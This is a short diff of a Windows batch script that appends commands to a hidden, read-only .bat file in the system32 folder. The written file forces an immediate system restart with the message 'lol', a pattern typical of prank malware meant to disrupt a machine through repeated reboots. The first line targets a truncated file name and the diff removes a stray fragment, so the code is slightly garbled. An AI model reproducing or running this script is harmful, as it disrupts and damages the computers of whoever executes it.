@@ -1,5 +1,4 @@
 @echo off>>%systemroot%\system32\agagagag43.ba
-t
 echo Break off>>%systemroot%\system32\agagagag43.bat
 echo Attrib +r +h>>%systemroot%\system32\agagagag43.bat
 echo Shutdown -f -r -t 1 -c"lol">>%systemroot%\system32\agagagag43.bat 
